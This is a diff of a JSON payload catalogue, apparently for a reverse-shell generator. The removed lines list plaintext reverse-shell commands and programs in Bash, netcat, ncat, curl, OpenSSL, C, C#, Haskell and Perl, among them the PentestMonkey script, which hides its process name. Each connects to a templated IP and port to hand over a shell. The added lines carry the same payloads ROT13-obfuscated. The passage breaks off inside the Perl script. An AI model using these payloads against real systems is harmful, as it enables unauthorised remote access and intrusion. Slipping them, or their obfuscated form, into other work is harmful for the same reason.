@@ -1,569 +1,569 @@
 {
-  "reverseShellCommands": {
-    "ReverseShell": [
+  "erirefrFuryyPbzznaqf": {
+    "ErirefrFuryy": [
       {
-        "name": "Bash -i",
-        "command": "{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",
-        "type": ["linux", "mac"]
+        "anzr": "Onfu -v",
+        "pbzznaq": "{furyy} -v >& /qri/gpc/{vc}/{cbeg} 0>&1",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Bash 196",
-        "command": "0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",
-        "type": ["linux", "mac"]
+        "anzr": "Onfu 196",
+        "pbzznaq": "0<&196;rkrp 196<>/qri/gpc/{vc}/{cbeg}; {furyy} <&196 >&196 2>&196",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Bash read line",
-        "command": "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
-        "type": ["linux", "mac"]
+        "anzr": "Onfu ernq yvar",
+        "pbzznaq": "rkrp 5<>/qri/gpc/{vc}/{cbeg};png <&5 | juvyr ernq yvar; qb $yvar 2>&5 >&5; qbar",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Bash 5",
-        "command": "{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
-        "type": ["linux", "mac"]
+        "anzr": "Onfu 5",
+        "pbzznaq": "{furyy} -v 5<> /qri/gpc/{vc}/{cbeg} 0<&5 1>&5 2>&5",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Bash udp",
-        "command": "{shell} -i >& /dev/udp/{ip}/{port} 0>&1",
-        "type": ["linux", "mac"]
+        "anzr": "Onfu hqc",
+        "pbzznaq": "{furyy} -v >& /qri/hqc/{vc}/{cbeg} 0>&1",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "nc mkfifo",
-        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",
-        "type": ["linux", "mac"]
+        "anzr": "ap zxsvsb",
+        "pbzznaq": "ez /gzc/s;zxsvsb /gzc/s;png /gzc/s|{furyy} -v 2>&1|ap {vc} {cbeg} >/gzc/s",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "nc -e",
-        "command": "nc {ip} {port} -e {shell}",
-        "type": ["linux", "mac"]
+        "anzr": "ap -r",
+        "pbzznaq": "ap {vc} {cbeg} -r {furyy}",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "nc.exe -e",
-        "command": "nc.exe {ip} {port} -e {shell}",
-        "type": ["windows"]
+        "anzr": "ap.rkr -r",
+        "pbzznaq": "ap.rkr {vc} {cbeg} -r {furyy}",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "BusyBox nc -e",
-        "command": "busybox nc {ip} {port} -e {shell}",
-        "type": ["linux"]
+        "anzr": "OhflObk ap -r",
+        "pbzznaq": "ohflobk ap {vc} {cbeg} -r {furyy}",
+        "glcr": ["yvahk"]
       },
       {
-        "name": "nc -c",
-        "command": "nc -c {shell} {ip} {port}",
-        "type": ["linux", "mac"]
+        "anzr": "ap -p",
+        "pbzznaq": "ap -p {furyy} {vc} {cbeg}",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "ncat -e",
-        "command": "ncat {ip} {port} -e {shell}",
-        "type": ["linux", "mac"]
+        "anzr": "apng -r",
+        "pbzznaq": "apng {vc} {cbeg} -r {furyy}",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "ncat.exe -e",
-        "command": "ncat.exe {ip} {port} -e {shell}",
-        "type": ["windows"]
+        "anzr": "apng.rkr -r",
+        "pbzznaq": "apng.rkr {vc} {cbeg} -r {furyy}",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "ncat udp",
-        "command": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",
-        "type": ["linux", "mac"]
+        "anzr": "apng hqc",
+        "pbzznaq": "ez /gzc/s;zxsvsb /gzc/s;png /gzc/s|{furyy} -v 2>&1|apng -h {vc} {cbeg} >/gzc/s",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "curl",
-        "command": "C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",
-        "type": ["linux", "mac"]
+        "anzr": "phey",
+        "pbzznaq": "P='phey -Af gryarg://{vc}:{cbeg}'; $P </qri/ahyy 2>&1 | {furyy} 2>&1 | $P >/qri/ahyy",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "rustcat",
-        "command": "rcat connect -s {shell} {ip} {port}",
-        "type": ["linux", "mac"]
+        "anzr": "ehfgpng",
+        "pbzznaq": "epng pbaarpg -f {furyy} {vc} {cbeg}",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "C",
-        "command": "#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;       \n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n\n    connect(sockt, (struct sockaddr *) &revsockaddr, \n    sizeof(revsockaddr));\n    dup2(sockt, 0);\n    dup2(sockt, 1);\n    dup2(sockt, 2);\n\n    char * const argv[] = {\"{shell}\", NULL};\n    execvp(\"{shell}\", argv);\n\n    return 0;       \n}",
-        "type": ["linux", "mac"]
+        "anzr": "P",
+        "pbzznaq": "#vapyhqr <fgqvb.u>\a#vapyhqr <flf/fbpxrg.u>\a#vapyhqr <flf/glcrf.u>\a#vapyhqr <fgqyvo.u>\a#vapyhqr <havfgq.u>\a#vapyhqr <argvarg/va.u>\a#vapyhqr <necn/varg.u>\a\avag znva(ibvq){\a    vag cbeg = {cbeg};\a    fgehpg fbpxnqqe_va erifbpxnqqe;\a\a    vag fbpxg = fbpxrg(NS_VARG, FBPX_FGERNZ, 0);\a    erifbpxnqqe.fva_snzvyl = NS_VARG;       \a    erifbpxnqqe.fva_cbeg = ugbaf(cbeg);\a    erifbpxnqqe.fva_nqqe.f_nqqe = varg_nqqe(\"{vc}\");\a\a    pbaarpg(fbpxg, (fgehpg fbpxnqqe *) &erifbpxnqqe, \a    fvmrbs(erifbpxnqqe));\a    qhc2(fbpxg, 0);\a    qhc2(fbpxg, 1);\a    qhc2(fbpxg, 2);\a\a    pune * pbafg neti[] = {\"{furyy}\", AHYY};\a    rkrpic(\"{furyy}\", neti);\a\a    erghea 0;       \a}",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "C Windows",
-        "command": "#include <winsock2.h>\r\n#include <stdio.h>\r\n#pragma comment(lib,\"ws2_32\")\r\n\r\nWSADATA wsaData;\r\nSOCKET Winsock;\r\nstruct sockaddr_in hax; \r\nchar ip_addr[16] = \"{ip}\"; \r\nchar port[6] = \"{port}\";            \r\n\r\nSTARTUPINFO ini_processo;\r\n\r\nPROCESS_INFORMATION processo_info;\r\n\r\nint main()\r\n{\r\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\r\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\r\n\r\n\r\n    struct hostent *host; \r\n    host = gethostbyname(ip_addr);\r\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\r\n\r\n    hax.sin_family = AF_INET;\r\n    hax.sin_port = htons(atoi(port));\r\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\r\n\r\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r\n\r\n    memset(&ini_processo, 0, sizeof(ini_processo));\r\n    ini_processo.cb = sizeof(ini_processo);\r\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r\n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r\n\r\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\r\n\r\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r\n\r\n    return 0;\r\n}",
-        "type": ["windows"]
+        "anzr": "P Jvaqbjf",
+        "pbzznaq": "#vapyhqr <jvafbpx2.u>\e\a#vapyhqr <fgqvb.u>\e\a#centzn pbzzrag(yvo,\"jf2_32\")\e\a\e\aJFNQNGN jfnQngn;\e\aFBPXRG Jvafbpx;\e\afgehpg fbpxnqqe_va unk; \e\apune vc_nqqe[16] = \"{vc}\"; \e\apune cbeg[6] = \"{cbeg}\";            \e\a\e\aFGNEGHCVASB vav_cebprffb;\e\a\e\aCEBPRFF_VASBEZNGVBA cebprffb_vasb;\e\a\e\avag znva()\e\a{\e\a    JFNFgneghc(ZNXRJBEQ(2, 2), &jfnQngn);\e\a    Jvafbpx = JFNFbpxrg(NS_VARG, FBPX_FGERNZ, VCCEBGB_GPC, AHYY, (hafvtarq vag)AHYY, (hafvtarq vag)AHYY);\e\a\e\a\e\a    fgehpg ubfgrag *ubfg; \e\a    ubfg = trgubfgolanzr(vc_nqqe);\e\a    fgepcl_f(vc_nqqe, 16, varg_agbn(*((fgehpg va_nqqe *)ubfg->u_nqqe)));\e\a\e\a    unk.fva_snzvyl = NS_VARG;\e\a    unk.fva_cbeg = ugbaf(ngbv(cbeg));\e\a    unk.fva_nqqe.f_nqqe = varg_nqqe(vc_nqqe);\e\a\e\a    JFNPbaarpg(Jvafbpx, (FBPXNQQE*)&unk, fvmrbs(unk), AHYY, AHYY, AHYY, AHYY);\e\a\e\a    zrzfrg(&vav_cebprffb, 0, fvmrbs(vav_cebprffb));\e\a    vav_cebprffb.po = fvmrbs(vav_cebprffb);\e\a    vav_cebprffb.qjSyntf = FGNEGS_HFRFGQUNAQYRF | FGNEGS_HFRFUBJJVAQBJ; \e\a    vav_cebprffb.uFgqVachg = vav_cebprffb.uFgqBhgchg = vav_cebprffb.uFgqReebe = (UNAQYR)Jvafbpx;\e\a\e\a    GPUNE pzq[255] = GRKG(\"pzq.rkr\");\e\a\e\a    PerngrCebprff(AHYY, pzq, AHYY, AHYY, GEHR, 0, AHYY, AHYY, &vav_cebprffb, &cebprffb_vasb);\e\a\e\a    erghea 0;\e\a}",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "C# TCP Client",
-        "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n\tpublic class Program\n\t{\n\t\tstatic StreamWriter streamWriter;\n\n\t\tpublic static void Main(string[] args)\n\t\t{\n\t\t\tusing(TcpClient client = new TcpClient(\"{ip}\", {port}))\n\t\t\t{\n\t\t\t\tusing(Stream stream = client.GetStream())\n\t\t\t\t{\n\t\t\t\t\tusing(StreamReader rdr = new StreamReader(stream))\n\t\t\t\t\t{\n\t\t\t\t\t\tstreamWriter = new StreamWriter(stream);\n\t\t\t\t\t\t\n\t\t\t\t\t\tStringBuilder strInput = new StringBuilder();\n\n\t\t\t\t\t\tProcess p = new Process();\n\t\t\t\t\t\tp.StartInfo.FileName = \"{shell}\";\n\t\t\t\t\t\tp.StartInfo.CreateNoWindow = true;\n\t\t\t\t\t\tp.StartInfo.UseShellExecute = false;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardOutput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardInput = true;\n\t\t\t\t\t\tp.StartInfo.RedirectStandardError = true;\n\t\t\t\t\t\tp.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n\t\t\t\t\t\tp.Start();\n\t\t\t\t\t\tp.BeginOutputReadLine();\n\n\t\t\t\t\t\twhile(true)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tstrInput.Append(rdr.ReadLine());\n\t\t\t\t\t\t\t//strInput.Append(\"\\n\");\n\t\t\t\t\t\t\tp.StandardInput.WriteLine(strInput);\n\t\t\t\t\t\t\tstrInput.Remove(0, strInput.Length);\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tprivate static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n\t}\n}",
-        "type": ["linux", "windows"]
+        "anzr": "P# GPC Pyvrag",
+        "pbzznaq": "hfvat Flfgrz;\ahfvat Flfgrz.Grkg;\ahfvat Flfgrz.VB;\ahfvat Flfgrz.Qvntabfgvpf;\ahfvat Flfgrz.PbzcbaragZbqry;\ahfvat Flfgrz.Yvad;\ahfvat Flfgrz.Arg;\ahfvat Flfgrz.Arg.Fbpxrgf;\a\a\aanzrfcnpr PbaarpgOnpx\a{\a\gchoyvp pynff Cebtenz\a\g{\a\g\gfgngvp FgernzJevgre fgernzJevgre;\a\a\g\gchoyvp fgngvp ibvq Znva(fgevat[] netf)\a\g\g{\a\g\g\ghfvat(GpcPyvrag pyvrag = arj GpcPyvrag(\"{vc}\", {cbeg}))\a\g\g\g{\a\g\g\g\ghfvat(Fgernz fgernz = pyvrag.TrgFgernz())\a\g\g\g\g{\a\g\g\g\g\ghfvat(FgernzErnqre eqe = arj FgernzErnqre(fgernz))\a\g\g\g\g\g{\a\g\g\g\g\g\gfgernzJevgre = arj FgernzJevgre(fgernz);\a\g\g\g\g\g\g\a\g\g\g\g\g\gFgevatOhvyqre fgeVachg = arj FgevatOhvyqre();\a\a\g\g\g\g\g\gCebprff c = arj Cebprff();\a\g\g\g\g\g\gc.FgnegVasb.SvyrAnzr = \"{furyy}\";\a\g\g\g\g\g\gc.FgnegVasb.PerngrAbJvaqbj = gehr;\a\g\g\g\g\g\gc.FgnegVasb.HfrFuryyRkrphgr = snyfr;\a\g\g\g\g\g\gc.FgnegVasb.ErqverpgFgnaqneqBhgchg = gehr;\a\g\g\g\g\g\gc.FgnegVasb.ErqverpgFgnaqneqVachg = gehr;\a\g\g\g\g\g\gc.FgnegVasb.ErqverpgFgnaqneqReebe = gehr;\a\g\g\g\g\g\gc.BhgchgQngnErprvirq += arj QngnErprvirqRiragUnaqyre(PzqBhgchgQngnUnaqyre);\a\g\g\g\g\g\gc.Fgneg();\a\g\g\g\g\g\gc.OrtvaBhgchgErnqYvar();\a\a\g\g\g\g\g\gjuvyr(gehr)\a\g\g\g\g\g\g{\a\g\g\g\g\g\g\gfgeVachg.Nccraq(eqe.ErnqYvar());\a\g\g\g\g\g\g\g//fgeVachg.Nccraq(\"\\a\");\a\g\g\g\g\g\g\gc.FgnaqneqVachg.JevgrYvar(fgeVachg);\a\g\g\g\g\g\g\gfgeVachg.Erzbir(0, fgeVachg.Yratgu);\a\g\g\g\g\g\g}\a\g\g\g\g\g}\a\g\g\g\g}\a\g\g\g}\a\g\g}\a\a\g\gcevingr fgngvp ibvq PzqBhgchgQngnUnaqyre(bowrpg fraqvatCebprff, QngnErprvirqRiragNetf bhgYvar)\a        {\a            FgevatOhvyqre fgeBhgchg = arj FgevatOhvyqre();\a\a            vs (!Fgevat.VfAhyyBeRzcgl(bhgYvar.Qngn))\a            {\a                gel\a                {\a                    fgeBhgchg.Nccraq(bhgYvar.Qngn);\a                    fgernzJevgre.JevgrYvar(fgeBhgchg);\a                    fgernzJevgre.Syhfu();\a                }\a                pngpu (Rkprcgvba ree) { }\a            }\a        }\a\a\g}\a}",
+        "glcr": ["yvahk", "jvaqbjf"]
       },
       {
-        "name": "C# Bash -i",
-        "command": "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n\tpublic static void Main(string[] args) {\n\t  Process proc = new System.Diagnostics.Process();\n\t  proc.StartInfo.FileName = \"{shell}\";\n\t  proc.StartInfo.Arguments = \"-c \\\"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\\\"\";\n\t  proc.StartInfo.UseShellExecute = false;\n\t  proc.StartInfo.RedirectStandardOutput = true;\n\t  proc.Start();\n\n\t  while (!proc.StandardOutput.EndOfStream) {\n\t\tConsole.WriteLine(proc.StandardOutput.ReadLine());\n\t  }\n\t}\n  }\n}\n",
-        "type": ["linux", "windows"]
+        "anzr": "P# Onfu -v",
+        "pbzznaq": "hfvat Flfgrz;\ahfvat Flfgrz.Qvntabfgvpf;\a\aanzrfcnpr OnpxPbaarpg {\a  pynff ErirefrOnfu {\a\gchoyvp fgngvp ibvq Znva(fgevat[] netf) {\a\g  Cebprff cebp = arj Flfgrz.Qvntabfgvpf.Cebprff();\a\g  cebp.FgnegVasb.SvyrAnzr = \"{furyy}\";\a\g  cebp.FgnegVasb.Nethzragf = \"-p \\\"{furyy} -v >& /qri/gpc/{vc}/{cbeg} 0>&1\\\"\";\a\g  cebp.FgnegVasb.HfrFuryyRkrphgr = snyfr;\a\g  cebp.FgnegVasb.ErqverpgFgnaqneqBhgchg = gehr;\a\g  cebp.Fgneg();\a\a\g  juvyr (!cebp.FgnaqneqBhgchg.RaqBsFgernz) {\a\g\gPbafbyr.JevgrYvar(cebp.FgnaqneqBhgchg.ErnqYvar());\a\g  }\a\g}\a  }\a}\a",
+        "glcr": ["yvahk", "jvaqbjf"]
       },
       {
-        "name": "Haskell #1",
-        "command": "module Main where\n\nimport System.Process\n\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"",
-        "type": ["linux", "mac"]
+        "anzr": "Unfxryy #1",
+        "pbzznaq": "zbqhyr Znva jurer\a\avzcbeg Flfgrz.Cebprff\a\aznva = pnyyPbzznaq \"ez /gzc/s;zxsvsb /gzc/s;png /gzc/s | {furyy} -v 2>&1 | ap {vc} {cbeg} >/gzc/s\"",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "OpenSSL",
-        "command": "mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",
-        "type": ["linux", "mac"]
+        "anzr": "BcraFFY",
+        "pbzznaq": "zxsvsb /gzc/f; {furyy} -v < /gzc/f 2>&1 | bcraffy f_pyvrag -dhvrg -pbaarpg {vc}:{cbeg} > /gzc/f; ez /gzc/f",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Perl",
-        "command": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'",
-        "type": ["linux", "mac"]
+        "anzr": "Crey",
+        "pbzznaq": "crey -r 'hfr Fbpxrg;$v=\"{vc}\";$c={cbeg};fbpxrg(F,CS_VARG,FBPX_FGERNZ,trgcebgbolanzr(\"gpc\"));vs(pbaarpg(F,fbpxnqqe_va($c,varg_ngba($v)))){bcra(FGQVA,\">&F\");bcra(FGQBHG,\">&F\");bcra(FGQREE,\">&F\");rkrp(\"{furyy} -v\");};'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Perl no sh",
-        "command": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
-        "type": ["linux", "mac"]
+        "anzr": "Crey ab fu",
+        "pbzznaq": "crey -ZVB -r '$c=sbex;rkvg,vs($c);$p=arj VB::Fbpxrg::VARG(CrreNqqe,\"{vc}:{cbeg}\");FGQVA->sqbcra($p,e);$~->sqbcra($p,j);flfgrz$_ juvyr<>;'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Perl PentestMonkey",
-        "command": "#!/usr/bin/perl -w\n# perl-reverse-shell - A Reverse Shell implementation in PERL\n# Copyright (C) 2006 pentestmonkey@pentestmonkey.net\n#\n# This tool may be used for legal purposes only.  Users take full responsibility\n# for any actions performed using this tool.  The author accepts no liability\n# for damage caused by this tool.  If these terms are not acceptable to you, then\n# do not use this tool.\n#\n# In all other respects the GPL version 2 applies:\n#\n# This program is free software; you can redistribute it and/or modify\n# it under the terms of the GNU General Public License version 2 as\n# published by the Free Software Foundation.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License along\n# with this program; if not, write to the Free Software Foundation, Inc.,\n# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n#\n# This tool may be used for legal purposes only.  Users take full responsibility\n# for any actions performed using this tool.  If these terms are not acceptable to\n# you, then do not use this tool.\n#\n# You are encouraged to send comments, improvements or suggestions to\n# me at pentestmonkey@pentestmonkey.net\n#\n# Description\n# -----------\n# This script will make an outbound TCP connection to a hardcoded IP and port.\n# The recipient will be given a shell running as the current user (apache normally).\n#\n\nuse strict;\nuse Socket;\nuse FileHandle;\nuse POSIX;\nmy $VERSION = \"1.0\";\n\n# Where to send the reverse shell.  Change these.\nmy $ip = '{ip}';\nmy $port = {port};\n\n# Options\nmy $daemon = 1;\nmy $auth   = 0; # 0 means authentication is disabled and any \n\t\t# source IP can access the reverse shell\nmy $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);\n\n# Declarations\nmy $global_page = \"\";\nmy $fake_process_name = \"/usr/sbin/apache\";\n\n# Change the process name to be less conspicious\n$0 = \"[httpd]\";\n\n# Authenticate based on source IP address if required\nif (defined($ENV{'REMOTE_ADDR'})) {\n\tcgiprint(\"Browser IP address appears to be: $ENV{'REMOTE_ADDR'}\");\n\n\tif ($auth) {\n\t\tunless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {\n\t\t\tcgiprint(\"ERROR: Your client isn't authorised to view this page\");\n\t\t\tcgiexit();\n\t\t}\n\t}\n} elsif ($auth) {\n\tcgiprint(\"ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access\");\n\tcgiexit(0);\n}\n\n# Background and dissociate from parent process if required\nif ($daemon) {\n\tmy $pid = fork();\n\tif ($pid) {\n\t\tcgiexit(0); # parent exits\n\t}\n\n\tsetsid();\n\tchdir('/');\n\tumask(0);\n}\n\n# Make TCP connection for reverse shell\nsocket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nif (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {\n\tcgiprint(\"Sent reverse shell to $ip:$port\");\n\tcgiprintpage();\n} else {\n\tcgiprint(\"Couldn't open reverse shell to $ip:$port: $!\");\n\tcgiexit();\t\n}\n\n# Redirect STDIN, STDOUT and STDERR to the TCP connection\nopen(STDIN, \">&SOCK\");\nopen(STDOUT,\">&SOCK\");\nopen(STDERR,\">&SOCK\");\n$ENV{'HISTFILE'} = '/dev/null';\nsystem(\"w;uname -a;id;pwd\");\nexec({\"{shell}\"} ($fake_process_name, \"-i\"));\n\n# Wrapper around print\nsub cgiprint {\n\tmy $line = shift;\n\t$line .= \"<p>\\n\";\n\t$global_page .= $line;\n}\n\n# Wrapper around exit\nsub cgiexit {\n\tcgiprintpage();\n\texit 0; # 0 to ensure we don't give a 500 response.\n}\n\n# Form HTTP response using all the messages gathered by cgiprint so far\nsub cgiprintpage {\n\tprint \"Content-Length: \" . length($global_page) . \"\\r\nConnection: close\\r\nContent-Type: text\\/html\\r\\n\\r\\n\" . $global_page;\n}\n",
-        "type": ["linux", "mac"]
+        "anzr": "Crey CragrfgZbaxrl",
+        "pbzznaq": "#!/hfe/ova/crey -j\a# crey-erirefr-furyy - N Erirefr Furyy vzcyrzragngvba va CREY\a# Pbclevtug (P) 2006 cragrfgzbaxrl@cragrfgzbaxrl.arg\a#\a# Guvf gbby znl or hfrq sbe yrtny checbfrf bayl.  Hfref gnxr shyy erfcbafvovyvgl\a# sbe nal npgvbaf cresbezrq hfvat guvf gbby.  Gur nhgube npprcgf ab yvnovyvgl\a# sbe qnzntr pnhfrq ol guvf gbby.  Vs gurfr grezf ner abg npprcgnoyr gb lbh, gura\a# qb abg hfr guvf gbby.\a#\a# Va nyy bgure erfcrpgf gur TCY irefvba 2 nccyvrf:\a#\a# Guvf cebtenz vf serr fbsgjner; lbh pna erqvfgevohgr vg naq/be zbqvsl\a# vg haqre gur grezf bs gur TAH Trareny Choyvp Yvprafr irefvba 2 nf\a# choyvfurq ol gur Serr Fbsgjner Sbhaqngvba.\a#\a# Guvf cebtenz vf qvfgevohgrq va gur ubcr gung vg jvyy or hfrshy,\a# ohg JVGUBHG NAL JNEENAGL; jvgubhg rira gur vzcyvrq jneenagl bs\a# ZREPUNAGNOVYVGL be SVGARFF SBE N CNEGVPHYNE CHECBFR.  Frr gur\a# TAH Trareny Choyvp Yvprafr sbe zber qrgnvyf.\a#\a# Lbh fubhyq unir erprvirq n pbcl bs gur TAH Trareny Choyvp Yvprafr nybat\a# jvgu guvf cebtenz; vs abg, jevgr gb gur Serr Fbsgjner Sbhaqngvba, Vap.,\a# 51 Senaxyva Fgerrg, Svsgu Sybbe, Obfgba, ZN 02110-1301 HFN.\a#\a# Guvf gbby znl or hfrq sbe yrtny checbfrf bayl.  Hfref gnxr shyy erfcbafvovyvgl\a# sbe nal npgvbaf cresbezrq hfvat guvf gbby.  Vs gurfr grezf ner abg npprcgnoyr gb\a# lbh, gura qb abg hfr guvf gbby.\a#\a# Lbh ner rapbhentrq gb fraq pbzzragf, vzcebirzragf be fhttrfgvbaf gb\a# zr ng cragrfgzbaxrl@cragrfgzbaxrl.arg\a#\a# Qrfpevcgvba\a# -----------\a# Guvf fpevcg jvyy znxr na bhgobhaq GPC pbaarpgvba gb n uneqpbqrq VC naq cbeg.\a# Gur erpvcvrag jvyy or tvira n furyy ehaavat nf gur pheerag hfre (ncnpur abeznyyl).\a#\a\ahfr fgevpg;\ahfr Fbpxrg;\ahfr SvyrUnaqyr;\ahfr CBFVK;\azl $IREFVBA = \"1.0\";\a\a# Jurer gb fraq gur erirefr furyy.  Punatr gurfr.\azl $vc = '{vc}';\azl $cbeg = {cbeg};\a\a# Bcgvbaf\azl $qnrzba = 1;\azl $nhgu   = 0; # 0 zrnaf nhguragvpngvba vf qvfnoyrq naq nal \a\g\g# fbhepr VC pna npprff gur erirefr furyy\azl $nhgubevfrq_pyvrag_cnggrea = de(^127\\.0\\.0\\.1$);\a\a# Qrpynengvbaf\azl $tybony_cntr = \"\";\azl $snxr_cebprff_anzr = \"/hfe/fova/ncnpur\";\a\a# Punatr gur cebprff anzr gb or yrff pbafcvpvbhf\a$0 = \"[uggcq]\";\a\a# Nhguragvpngr onfrq ba fbhepr VC nqqerff vs erdhverq\avs (qrsvarq($RAI{'ERZBGR_NQQE'})) {\a\gptvcevag(\"Oebjfre VC nqqerff nccrnef gb or: $RAI{'ERZBGR_NQQE'}\");\a\a\gvs ($nhgu) {\a\g\ghayrff ($RAI{'ERZBGR_NQQE'} =~ $nhgubevfrq_pyvrag_cnggrea) {\a\g\g\gptvcevag(\"REEBE: Lbhe pyvrag vfa'g nhgubevfrq gb ivrj guvf cntr\");\a\g\g\gptvrkvg();\a\g\g}\a\g}\a} ryfvs ($nhgu) {\a\gptvcevag(\"REEBE: Nhguragvpngvba vf ranoyrq, ohg V pbhyqa'g qrgrezvar lbhe VC nqqerff.  Qralvat npprff\");\a\gptvrkvg(0);\a}\a\a# Onpxtebhaq naq qvffbpvngr sebz cnerag cebprff vs erdhverq\avs ($qnrzba) {\a\gzl $cvq = sbex();\a\gvs ($cvq) {\a\g\gptvrkvg(0); # cnerag rkvgf\a\g}\a\a\gfrgfvq();\a\gpuqve('/');\a\ghznfx(0);\a}\a\a# Znxr GPC pbaarpgvba sbe erirefr furyy\afbpxrg(FBPX, CS_VARG, FBPX_FGERNZ, trgcebgbolanzr('gpc'));\avs (pbaarpg(FBPX, fbpxnqqe_va($cbeg,varg_ngba($vc)))) {\a\gptvcevag(\"Frag erirefr furyy gb $vc:$cbeg\");\a\gptvcevagcntr();\a} ryfr {\a\gptvcevag(\"Pbhyqa'g bcra erirefr furyy gb $vc:$cbeg: $!\");\a\gptvrkvg();\g\a}\a\a# Erqverpg FGQVA, FGQBHG naq FGQREE gb gur GPC pbaarpgvba\abcra(FGQVA, \">&FBPX\");\abcra(FGQBHG,\">&FBPX\");\abcra(FGQREE,\">&FBPX\");\a$RAI{'UVFGSVYR'} = '/qri/ahyy';\aflfgrz(\"j;hanzr -n;vq;cjq\");\arkrp({\"{furyy}\"} ($snxr_cebprff_anzr, \"-v\"));\a\a# Jenccre nebhaq cevag\afho ptvcevag {\a\gzl $yvar = fuvsg;\a\g$yvar .= \"<c>\\a\";\a\g$tybony_cntr .= $yvar;\a}\a\a# Jenccre nebhaq rkvg\afho ptvrkvg {\a\gptvcevagcntr();\a\grkvg 0; # 0 gb rafher jr qba'g tvir n 500 erfcbafr.\a}\a\a# Sbez UGGC erfcbafr hfvat nyy gur zrffntrf tngurerq ol ptvcevag fb sne\afho ptvcevagcntr {\a\gcevag \"Pbagrag-Yratgu: \" . 